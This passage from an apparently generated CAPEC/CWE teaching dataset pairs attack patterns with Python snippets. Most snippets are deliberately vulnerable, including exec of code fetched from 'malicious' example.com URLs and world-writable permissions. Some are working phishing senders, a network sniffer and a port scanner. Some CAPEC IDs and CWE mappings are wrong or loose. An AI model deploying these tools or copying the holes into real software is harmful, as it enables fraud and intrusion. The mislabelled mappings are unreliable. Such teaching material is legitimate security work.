        "code_snippet": "import socket\n\n# This code demonstrates a simple client-server communication where sensitive data is transmitted in cleartext.\n# It embodies the concept of a Sniffing Attack (CAPEC-158) by not encrypting the data, making it vulnerable to interception.\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-311: Missing Encryption of Sensitive Data\n\n# Server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 12345))\nserver_socket.listen(1)\nprint('Server is listening on port 12345...')\n\nconn, addr = server_socket.accept()\nprint(f'Connection from {addr}')\n\n# Receive sensitive data in cleartext\nreceived_data = conn.recv(1024).decode('utf-8')\nprint(f'Received data: {received_data}')\n\nconn.close()\nserver_socket.close()\n\n# Client code\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient_socket.connect(('localhost', 12345))\n\n# Send sensitive data in cleartext\nsensitive_data = 'password123'\nclient_socket.send(sensitive_data.encode('utf-8'))\nprint(f'Sent data: {sensitive_data}')\n\nclient_socket.close()",
        "description": "This Python code snippet demonstrates a simple client-server communication where sensitive data (a password) is transmitted in cleartext. The server listens for incoming connections and receives data without any encryption, while the client sends the sensitive data in cleartext. This setup embodies the concept of a Sniffing Attack (CAPEC-158) by making the data vulnerable to interception. The code also highlights CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-311 (Missing Encryption of Sensitive Data), as the sensitive information is not encrypted before transmission, making it susceptible to being sniffed by unauthorized actors."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "import socket\n\n# Create a raw socket to sniff network traffic\nsniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Bind the socket to the public network interface\nsniffer.bind(('0.0.0.0', 0))\n\n# Include IP headers in the capture\nsniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\nprint('Sniffing network traffic...')\n\ntry:\n    while True:\n        # Receive a packet\n        packet, addr = sniffer.recvfrom(65565)\n        # Print the raw packet data\n        print(packet)\nexcept KeyboardInterrupt:\n    print('Stopping the sniffer')\n    sniffer.close()",
        "description": "This Python code snippet demonstrates a basic network sniffer using raw sockets. The sniffer captures TCP/IP packets on a public network interface and prints the raw packet data. This embodies the main idea of the CAPEC 'Sniffing Network Traffic' by passively monitoring network traffic to capture sensitive information. The code does not encrypt the captured data (CWE-311), transmits it in cleartext (CWE-319), and could potentially expose sensitive system information (CWE-497). The sniffer operates passively, without influencing the network traffic, aligning with the CAPEC description."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-426: Untrusted Search Path\n# CWE-427: Uncontrolled Search Path Element\n# CWE-73: External Control of File Name or Path\n# CWE-706: Use of Incorrectly-Resolved Name or Reference\n\n# Simulate an untrusted search path provided by an external source\nuntrusted_path = '/tmp/malicious_libs'\n\n# Add the untrusted path to the system's search path\nos.environ['LD_LIBRARY_PATH'] = untrusted_path + ':' + os.environ.get('LD_LIBRARY_PATH', '')\n\n# Attempt to load a library, which could be malicious due to the untrusted search path\ntry:\n    ctypes.CDLL('example_lib.so')\nexcept OSError as e:\n    print(f'Error loading library: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability where an application uses an untrusted search path to load external libraries. The code sets an environment variable 'LD_LIBRARY_PATH' to include a directory that could be controlled by an attacker ('/tmp/malicious_libs'). When the application attempts to load 'example_lib.so' using ctypes.CDLL, it may load a malicious library from the untrusted path. This represents the CAPEC 'Redirect Access to Libraries' by showing how an attacker can manipulate the library search path to execute arbitrary code. The related CWEs highlight the risks of using untrusted paths and external control over file names or paths."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/execute', methods=['POST'])\ndef execute_script():\n    script = request.form['script']\n    # Vulnerable to script injection\n    return render_template_string(f'<html><body><script>{script}</script></body></html>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to script injection attacks. The '/execute' endpoint accepts a POST request containing a 'script' parameter. The script is then directly embedded into an HTML template using Flask's render_template_string function without any sanitization or validation. This allows an attacker to inject malicious scripts, which can be executed in the context of the web application, leading to potential security breaches. This example embodies the main idea of the CAPEC 'Exploit Script-Based APIs' and highlights related CWEs such as CWE-79 (Cross-site Scripting) and CWE-81 (Improper Neutralization of Script in an Error Message Web Page)."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "import socket\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\ndef vulnerable_client(server_ip, server_port):\n    try:\n        # Create a socket object\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # CWE-941: Incorrectly specified destination (attacker's IP instead of legitimate server)\n        s.connect((server_ip, server_port))\n        \n        # CWE-923: No verification of the server's identity\n        # CWE-924: No integrity check on the message\n        message = 'GET / HTTP/1.1\\r\\nHost: ' + server_ip + '\\r\\n\\r\\n'\n        s.sendall(message.encode('utf-8'))\n        \n        # Receive data from the server\n        response = s.recv(4096)\n        print(response.decode('utf-8'))\n        \n        # CWE-497: Potential exposure of sensitive information\n        sensitive_info = 'User: admin, Password: admin123'\n        s.sendall(sensitive_info.encode('utf-8'))\n        \n    except Exception as e:\n        print(f'An error occurred: {e}')\n    finally:\n        s.close()\n\n# Example usage\nvulnerable_client('192.168.1.100', 80)  # Attacker's IP and port",
        "description": "This Python code snippet demonstrates a vulnerable client that connects to a server. The vulnerabilities are as follows:\n\n1. **CWE-941**: The client connects to an attacker-controlled IP address instead of a legitimate server, representing an incorrectly specified destination.\n2. **CWE-923**: The client does not verify the server's identity, allowing for improper restriction of the communication channel to intended endpoints.\n3. **CWE-924**: The client does not enforce message integrity during transmission, making it susceptible to message tampering.\n4. **CWE-497**: The client sends sensitive information (username and password) without proper protection, exposing it to unauthorized control spheres.\n\nThis code embodies the main idea of the CAPEC 'Infrastructure Manipulation' by showing how an attacker can manipulate the routing of network messages to intercept sensitive information and exploit the communication channel."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/purchase', methods=['GET', 'POST'])\ndef purchase():\n    if request.method == 'POST':\n        # Vulnerable: Trusting client-side hidden field for price\n        item_price = request.form['price']\n        quantity = request.form['quantity']\n        total_cost = float(item_price) * int(quantity)\n        return f'Total cost: ${total_cost}'\n    return render_template_string('''\n        <form method=\"post\">\n            <input type=\"hidden\" name=\"price\" value=\"100\">\n            Quantity: <input type=\"text\" name=\"quantity\" value=\"1\">\n            <input type=\"submit\" value=\"Buy\">\n        </form>\n    ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has a purchase endpoint that processes a form submission. The form includes a hidden field for the item price, which is trusted by the server when calculating the total cost. An attacker can manipulate this hidden field to alter the price, exploiting the server's reliance on client-side data. This embodies the CAPEC 'Manipulating Hidden Fields' and related CWEs, such as CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-472 (External Control of Assumed-Immutable Web Parameter)."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\n# Function to send a spear phishing email\ndef send_spear_phishing_email(target_email, trusted_entity_email, trusted_entity_password, malicious_url):\n    # Create the email content\n    msg = MIMEMultipart()\n    msg['From'] = trusted_entity_email\n    msg['To'] = target_email\n    msg['Subject'] = 'Important Update from Your Trusted Entity'\n\n    # Email body with a malicious URL\n    body = f\"Dear User,\\n\\nWe have an important update for you. Please visit the following link to review: {malicious_url}\\n\\nBest Regards,\\nTrusted Entity\"\n    msg.attach(MIMEText(body, 'plain'))\n\n    # Send the email using the trusted entity's email account\n    try:\n        server = smtplib.SMTP('smtp.example.com', 587)\n        server.starttls()\n        server.login(trusted_entity_email, trusted_entity_password)\n        text = msg.as_string()\n        server.sendmail(trusted_entity_email, target_email, text)\n        server.quit()\n        print('Spear phishing email sent successfully')\n    except Exception as e:\n        print(f'Failed to send email: {e}')\n\n# Example usage\nsend_spear_phishing_email('target@example.com', 'trusted_entity@example.com', 'password123', 'http://malicious.example.com')",
        "description": "This Python code snippet demonstrates a spear phishing attack by sending a targeted email from a compromised trusted entity's email account. The email contains a malicious URL that the target is encouraged to visit. The email is crafted to appear legitimate and relevant to the target, increasing the likelihood of the target following the malicious link. This example leverages CWE-601 (URL Redirection to Untrusted Site) by including a malicious URL in the email body. The code also implicitly touches on CWE-451 (User Interface Misrepresentation of Critical Information) by spoofing the sender's email address to appear as a trusted entity."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-451: UI Misrepresentation of Critical Information\nphishing_message = \"Your account has been compromised. Please visit http://fakebank.com to secure your account.\"\n\n# CWE-290: Authentication Bypass by Spoofing\nspoofed_sender = \"security@realbank.com\"\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-308: Use of Single-factor Authentication\n\n# Function to send phishing SMS via email-to-SMS gateway\ndef send_phishing_sms(phone_number):\n    msg = MIMEText(phishing_message)\n    msg['From'] = spoofed_sender\n    msg['To'] = f\"{phone_number}@sms.gateway.com\"\n    msg['Subject'] = \"Urgent: Account Security Alert\"\n\n    try:\n        with smtplib.SMTP('smtp.mailserver.com', 587) as server:\n            server.starttls()\n            server.login('attacker@example.com', 'password')\n            server.sendmail(spoofed_sender, [msg['To']], msg.as_string())\n            print(f\"Phishing SMS sent to {phone_number}\")\n    except Exception as e:\n        print(f\"Failed to send phishing SMS: {e}\")\n\n# Example usage\nsend_phishing_sms('1234567890')",
        "description": "This Python code snippet demonstrates a mobile phishing attack by sending a phishing SMS message via an email-to-SMS gateway. The message misrepresents critical information (CWE-451) by spoofing the sender's email address (CWE-290) to appear as a legitimate source. The phishing message contains a link to a fake website designed to steal sensitive information. The code also highlights the risks associated with improper authentication mechanisms (CWE-307, CWE-309, CWE-308) by assuming the attacker can exploit these weaknesses to gain unauthorized access. This example encapsulates the main idea of the CAPEC by illustrating how an adversary can target mobile phone users with a phishing attack initiated via SMS."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "import os\n\ndef process_file(file_path):\n    # CWE-22: Path Traversal\n    if not file_path.startswith('/safe/directory/'): \n        raise ValueError('Invalid file path')\n\n    # CWE-73: External Control of File Name or Path\n    with open(file_path, 'r') as file:\n        content = file.read()\n\n    # CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n    if file_path.endswith('.txt'):\n        process_as_text(content)\n    elif file_path.endswith('.jpg'):\n        process_as_image(content)\n    else:\n        raise ValueError('Unsupported file type')\n\n    # CWE-377: Insecure Temporary File\n    temp_file_path = '/tmp/tempfile'\n    with open(temp_file_path, 'w') as temp_file:\n        temp_file.write(content)\n\n    # CWE-99: Improper Control of Resource Identifiers\n    os.system(f'cat {temp_file_path}')\n\n\ndef process_as_text(content):\n    print('Processing text file')\n\n\ndef process_as_image(content):\n    print('Processing image file')\n\n# Example usage\nuser_input_path = input('Enter the file path: ')\nprocess_file(user_input_path)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to file manipulation as described in the CAPEC. The `process_file` function takes a file path as input and performs various operations on the file. The code includes the following vulnerabilities:\n\n1. CWE-22 (Path Traversal): The code checks if the file path starts with a safe directory but does not properly neutralize special elements, potentially allowing path traversal attacks.\n2. CWE-73 (External Control of File Name or Path): The file path is controlled by user input, which can lead to unauthorized file access.\n3. CWE-646 (Reliance on File Name or Extension of Externally-Supplied File): The code relies on the file extension to determine how to process the file, which can be exploited by an attacker to misclassify the file.\n4. CWE-377 (Insecure Temporary File): The code creates a temporary file in a predictable location, which can be exploited by an attacker.\n5. CWE-99 (Improper Control of Resource Identifiers): The code uses the `os.system` function to execute a command with the temporary file path, which can be manipulated by an attacker.\n\nOverall, the code snippet represents the main idea of the CAPEC by demonstrating how improper handling of file paths and file contents can lead to various security vulnerabilities."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "class SystemConfig:\n    def __init__(self):\n        self.config = {'setting1': 'value1', 'setting2': 'value2'}\n        self.authenticated = False\n\n    def reset_config(self):\n        if not self.authenticated:\n            self.config = {'setting1': 'default1', 'setting2': 'default2'}\n            print('Configuration reset to default values.')\n        else:\n            print('Unauthorized reset attempt.')\n\n    def authenticate(self, password):\n        if password == 'correct_password':\n            self.authenticated = True\n            print('Authenticated successfully.')\n        else:\n            print('Authentication failed.')\n\n# Example usage\nsystem = SystemConfig()\nsystem.reset_config()  # Resets configuration without authentication\nsystem.authenticate('correct_password')\nsystem.reset_config()  # Prevents reset after authentication",
        "description": "This Python code snippet defines a `SystemConfig` class that simulates a system configuration with a reset function. The `reset_config` method resets the configuration to default values if the user is not authenticated, demonstrating a lack of authentication for a critical function (CWE-306). The `authenticate` method simulates user authentication. The code highlights the vulnerability where an attacker can reset the system configuration to default values without proper authentication, embodying the main idea of CAPEC 'Force the System to Reset Values'. This can lead to potential exploitation of weaknesses in the system's prior state."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "import os\nimport logging\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = 'Sensitive Trace Data'\ntrace_file_path = '/tmp/trace_data.log'\n\n# Storing sensitive trace data in an unprotected location\nwith open(trace_file_path, 'w') as trace_file:\n    trace_file.write(trace_data)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nlogging.basicConfig(filename='/tmp/system_info.log', level=logging.DEBUG)\nlogging.debug('Sensitive system information: CPU usage, Memory usage, etc.')\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# Simulating activation of debug mode\nDEBUG_MODE = True\nif DEBUG_MODE:\n    print('Debug mode activated. Sensitive data and system state can be altered.')\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Simulating a security-critical function that might be optimized away\ndef security_critical_function():\n    # Security check\n    if not DEBUG_MODE:\n        print('Security check passed.')\n    else:\n        print('Security check failed.')\n\nsecurity_critical_function()",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'White Box Reverse Engineering' and associated CWEs. The code includes:\n\n1. **CWE-1323**: Sensitive trace data is stored in an unprotected location (`/tmp/trace_data.log`), making it accessible to unauthorized users.\n2. **CWE-497**: Sensitive system information is logged to a file (`/tmp/system_info.log`) without proper access control, exposing it to unauthorized actors.\n3. **CWE-1313**: A debug mode is activated at runtime, allowing for the alteration of system state and leakage of sensitive data.\n4. **CWE-1037**: A security-critical function (`security_critical_function`) includes a security check that might be optimized away by the processor, especially when debug mode is active.\n\nThe code represents the main idea of the CAPEC by showing how an attacker could use white box analysis techniques to discover and exploit these vulnerabilities in the software."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "import os\n\n# Create a file with an alternate data stream\nfile_path = 'example.txt'\nads_path = file_path + ':hidden_stream'\n\n# Write data to the main file\nwith open(file_path, 'w') as f:\n    f.write('This is the main file content.')\n\n# Write data to the alternate data stream\nwith open(ads_path, 'w') as f:\n    f.write('This is hidden content in ADS.')\n\n# Read data from the main file\nwith open(file_path, 'r') as f:\n    print('Main file content:', f.read())\n\n# Attempt to read data from the alternate data stream\ntry:\n    with open(ads_path, 'r') as f:\n        print('ADS content:', f.read())\nexcept FileNotFoundError:\n    print('ADS not found.')",
        "description": "This Python code snippet demonstrates the creation and usage of an Alternate Data Stream (ADS) in a Windows NTFS file system. The main file 'example.txt' is created and written with some content. An ADS named 'hidden_stream' is then created and written with hidden content. The code attempts to read and print the content of both the main file and the ADS. This example embodies the CAPEC concept by showing how an attacker could use ADS to hide data within a file, making it invisible to standard file listing utilities. The related CWEs are represented by the improper handling and detection of ADS, which can lead to security vulnerabilities such as hidden malicious scripts or data."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "import socket\n\n# Function to perform footprinting by probing open ports\ndef footprinting(target_ip):\n    open_ports = []\n    for port in range(1, 1024):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((target_ip, port))\n        if result == 0:\n            open_ports.append(port)\n        sock.close()\n    return open_ports\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    open_ports = footprinting(target_ip)\n    print(f'Open ports on {target_ip}: {open_ports}')",
        "description": "This Python code snippet demonstrates a basic footprinting technique by probing open ports on a target IP address. The function 'footprinting' iterates over a range of ports (1-1024) and checks if they are open by attempting to establish a connection. If a connection is successful, the port is added to the list of open ports. This activity aligns with the CAPEC description of probing and exploration to identify constituents and properties of the target. The code also indirectly highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it reveals open ports, which can be sensitive information. Additionally, it touches on CWE-205 (Observable Behavioral Discrepancy) as the behavior of open ports can reveal internal state information to an attacker."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "import requests\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nurl = 'http://example.com/login?username=admin&password=secret'\nresponse = requests.get(url)\n\n# CWE-209: Generation of Error Message Containing Sensitive Information\nif response.status_code != 200:\n    print(f'Error: {response.status_code} - {response.text}')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nserver_info = response.headers.get('Server')\nprint(f'Server Information: {server_info}')\n\n# CWE-1125: Excessive Attack Surface\n# The application exposes multiple endpoints that can be probed\nendpoints = ['/admin', '/login', '/register', '/api/data']\nfor endpoint in endpoints:\n    response = requests.get(f'http://example.com{endpoint}')\n    print(f'Endpoint: {endpoint}, Status Code: {response.status_code}')\n\n# CWE-494: Download of Code Without Integrity Check\ncode_url = 'http://example.com/scripts/malicious.py'\nmalicious_code = requests.get(code_url).text\nexec(malicious_code)",
        "description": "This Python code snippet demonstrates a web application fingerprinting attack by sending a series of probes to a web application. It uses the HTTP GET method with sensitive query strings (CWE-598) to access a login page. If an error occurs, it prints the error message containing potentially sensitive information (CWE-209). It also retrieves and prints server information from the response headers (CWE-497). The code then probes multiple endpoints, increasing the attack surface (CWE-1125). Finally, it downloads and executes a script from a remote location without verifying its integrity (CWE-494). This code highlights how an attacker can gather information about a web application to plan further attacks."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "user_input = input('Enter variable name: ')\n\n# CWE-627: Dynamic Variable Evaluation\nexec(f'{user_input} = 42')\n\n# CWE-95: Eval Injection\nexec(f'print({user_input})')",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-77: Manipulating User-Controlled Variables. The code takes user input to dynamically create and manipulate a variable using the 'exec' function. This is an example of CWE-627 (Dynamic Variable Evaluation) and CWE-95 (Eval Injection). The 'exec' function evaluates the user input as code, which can lead to arbitrary code execution if the input is not properly sanitized. This represents the main idea of the CAPEC by showing how user-controlled variables can be manipulated to execute potentially harmful code."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "import tkinter as tk\nfrom tkinter import messagebox\n\n# Function to simulate a malicious action\ndef malicious_action():\n    messagebox.showinfo(\"Download\", \"Downloading malicious software...\")\n    # Here, you would add the code to download and execute malicious software\n\n# Function to simulate a benign action\ndef benign_action():\n    messagebox.showinfo(\"Query\", \"Submitting your query...\")\n    # Here, you would add the code to submit a query\n\n# Create the main application window\nroot = tk.Tk()\nroot.title(\"Action Spoofing Example\")\n\n# Create a button that appears to submit a query but actually downloads software\nbutton = tk.Button(root, text=\"Submit Query\", command=malicious_action)\nbutton.pack(pady=20)\n\n# Start the Tkinter event loop\nroot.mainloop()",
        "description": "This Python code snippet uses the Tkinter library to create a simple GUI application that demonstrates the concept of Action Spoofing. The application has a button labeled 'Submit Query', which misleads the user into thinking that clicking it will submit a query. However, the button is programmed to execute a malicious action instead, such as downloading software. This embodies the main idea of CAPEC-139 (Action Spoofing) by tricking the user into performing an unintended action. The code also touches on CWE-451 (UI Misrepresentation of Critical Information) by misrepresenting the button's true function."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/flash', methods=['GET'])\ndef flash_injection():\n    flash_param = request.args.get('flash_param', '')\n    # CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\n    template = f\"<embed src='movie.swf' FlashVars='{flash_param}'></embed>\"\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Flash Parameter Injection. The application takes a user-supplied parameter 'flash_param' from the URL query string and directly embeds it into an HTML template without proper validation or neutralization. This can allow an attacker to inject malicious global parameters into the Flash file embedded within the HTML document. The code also highlights CWE-1336, where special elements in the template engine are not properly neutralized, leading to potential security risks."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "import requests\n\n# Vulnerable function that includes code from an external source\ndef include_code(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to retrieve code')\n\n# Example usage\ninclude_code('http://example.com/malicious_code.py')",
        "description": "This Python code snippet demonstrates a vulnerability where code is included from an external source and executed. The function 'include_code' takes a URL as input, retrieves the content from the URL using an HTTP GET request, and executes the retrieved code using the 'exec' function. This embodies the main idea of the CAPEC 'Code Inclusion' by showing how an adversary could exploit this weakness to force arbitrary code to be retrieved and executed. The related CWEs are represented as follows: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) is shown by importing code from an external URL, CWE-506 (Embedded Malicious Code) is implied by the potential for the included code to be malicious, CWE-94 (Code Injection) is represented by the use of 'exec' to execute the retrieved code, CWE-98 (PHP Remote File Inclusion) is analogous to the inclusion of code from an external source, and CWE-913 (Improper Control of Dynamically-Managed Code Resources) is demonstrated by the lack of restrictions on the retrieved code."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "import os\n\n# Vulnerable configuration file path\nconfig_file_path = '/etc/myapp/config.ini'\n\n# Function to read configuration\ndef read_config(file_path):\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Function to write configuration\ndef write_config(file_path, data):\n    with open(file_path, 'w') as file:\n        file.write(data)\n\n# Simulate an attacker modifying the configuration file\nattacker_data = '[Settings]\\nDebugMode=True\\n'\nwrite_config(config_file_path, attacker_data)\n\n# Application reads the modified configuration\nconfig_data = read_config(config_file_path)\nprint('Configuration Loaded:', config_data)\n\n# Application behavior changes based on the modified configuration\nif 'DebugMode=True' in config_data:\n    print('Debug mode enabled, security checks bypassed!')",
        "description": "This Python code snippet demonstrates a configuration/environment manipulation attack. The code simulates an attacker modifying an external configuration file used by an application. The attacker writes a new configuration that enables a debug mode, which could bypass security checks. The application then reads the modified configuration and changes its behavior based on the new settings. This example embodies the main idea of CAPEC-15 (Configuration/Environment Manipulation) and highlights CWE-15 (External Control of System or Configuration Setting) by showing how an attacker can externally control and manipulate configuration settings to affect the application's behavior."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "import os\n\n# Simulate a protected directory and file\nprotected_dir = '/protected'\nprotected_file = 'config.cfg'\n\n# Simulate an attacker creating a file with the same name in a different directory\nattacker_dir = '/tmp'\nattacker_file_path = os.path.join(attacker_dir, protected_file)\n\n# Create the attacker's file\nwith open(attacker_file_path, 'w') as f:\n    f.write('malicious content')\n\n# Vulnerable function that loads the configuration file\n# It searches the attacker's directory before the protected directory\nsearch_paths = [attacker_dir, protected_dir]\n\nfor path in search_paths:\n    file_path = os.path.join(path, protected_file)\n    if os.path.exists(file_path):\n        with open(file_path, 'r') as f:\n            config_content = f.read()\n        break\n\nprint(f'Loaded config content: {config_content}')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can create a file with the same name as a protected file in a different directory. The vulnerable function searches directories in a specific order and loads the first file it finds with the matching name. In this case, the attacker's file in '/tmp' is loaded before the legitimate file in '/protected'. This represents the CAPEC idea of exploiting file location algorithms by creating files with the same name as protected files. The related CWEs provide additional context, such as reliance on file names and external control of file paths, which contribute to the vulnerability."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "from flask import Flask, request, redirect\n\napp = Flask(__name__)\n\n@app.route('/redirect')\ndef open_redirect():\n    target_url = request.args.get('url')\n    if target_url:\n        return redirect(target_url)\n    return 'No URL provided', 400\n\n@app.route('/flash')\ndef flash_vulnerable():\n    flash_url = request.args.get('flash_url')\n    if flash_url:\n        return f'<embed src=\"{flash_url}\" type=\"application/x-shockwave-flash\"></embed>'\n    return 'No Flash URL provided', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a web application with two endpoints: '/redirect' and '/flash'. The '/redirect' endpoint demonstrates an open redirect vulnerability (CWE-601) by accepting a user-controlled 'url' parameter and redirecting the user to that URL without validation. The '/flash' endpoint demonstrates a Cross-Site Flashing vulnerability by embedding a Flash object using a user-controlled 'flash_url' parameter. This allows an attacker to provide a crafted link to a Flash document (SWF file), which can then execute additional malicious instructions. The code highlights the risks of accepting and using untrusted input directly in web applications, which can lead to various security issues such as open redirects, cross-site scripting, and cross-site flashing."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "from flask import Flask, request, jsonify, make_response\nimport json\n\napp = Flask(__name__)\n\n# Simulated micro-service endpoint\n@app.route('/api/userinfo', methods=['GET'])\ndef user_info():\n    # CWE-598: Using GET request with sensitive query strings\n    user_id = request.args.get('user_id')\n    if not user_id:\n        return make_response(jsonify({'error': 'User ID is required'}), 400)\n    \n    # CWE-219: Storing sensitive data under web root\n    try:\n        with open(f'./data/{user_id}.json', 'r') as file:\n            user_data = json.load(file)\n    except FileNotFoundError:\n        return make_response(jsonify({'error': 'User not found'}), 404)\n    \n    # CWE-539: Using persistent cookies with sensitive information\n    response = make_response(jsonify(user_data))\n    response.set_cookie('session_id', 'sensitive_session_data', max_age=60*60*24*30)  # 30 days\n    return response\n\n# CWE-602: Client-side enforcement of server-side security\n@app.route('/api/admin', methods=['GET'])\ndef admin_panel():\n    if request.cookies.get('role') != 'admin':\n        return make_response(jsonify({'error': 'Unauthorized access'}), 403)\n    return jsonify({'message': 'Welcome to the admin panel'})\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask framework to create a web application with two micro-service endpoints. The '/api/userinfo' endpoint demonstrates CWE-598 by using a GET request with a sensitive query string to retrieve user information. It also illustrates CWE-219 by storing sensitive user data under the web root and CWE-539 by setting a persistent cookie with sensitive information. The '/api/admin' endpoint shows CWE-602 by relying on client-side cookies to enforce server-side security, allowing unauthorized access if the cookie is manipulated. This code embodies the main idea of the CAPEC by exposing micro-services to potential exploitation through insecure practices."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "import os\n\n# Incorrectly configured access control\n# Sensitive directory path\nsensitive_path = '/etc/sensitive_data'\n\n# Incorrect permission assignment for critical resource (CWE-732)\nos.chmod(sensitive_path, 0o777)  # World-writable permissions\n\n# Function to read sensitive data\n# Insufficient granularity of access control (CWE-1220)\ndef read_sensitive_data(user):\n    if user in ['admin', 'user']:\n        with open(sensitive_path, 'r') as file:\n            return file.read()\n    else:\n        return 'Access Denied'\n\n# Example usage\nprint(read_sensitive_data('guest'))  # Unauthorized user can still access sensitive data",
        "description": "This Python code snippet demonstrates a scenario where access control is incorrectly configured, allowing unauthorized access to sensitive data. The sensitive directory '/etc/sensitive_data' is assigned world-writable permissions (CWE-732), making it accessible to any user. The function 'read_sensitive_data' checks if the user is either 'admin' or 'user' but lacks sufficient granularity in access control (CWE-1220), allowing unauthorized users like 'guest' to access the sensitive data. This embodies the main idea of the CAPEC by showing how incorrect configuration of access controls can lead to unauthorized access."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return render_template_string('''\n    <html>\n    <body>\n        <h1>Welcome to the vulnerable site</h1>\n        <iframe src=\"http://untrusted-domain.com\" style=\"opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;z-index:1000;\"></iframe>\n    </body>\n    </html>\n    ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates a clickjacking vulnerability. The main idea of the CAPEC (Flash File Overlay) is represented by embedding an iframe with a transparent overlay from an untrusted domain. The iframe is styled to cover the entire page and intercept user actions, which is a common technique in clickjacking attacks. The related CWEs are also represented: CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) is shown by allowing the iframe to overlay the entire page, CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) is implied by embedding content from an untrusted domain, and CWE-79 (Cross-site Scripting) is indirectly represented by the potential for the untrusted domain to serve malicious scripts."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
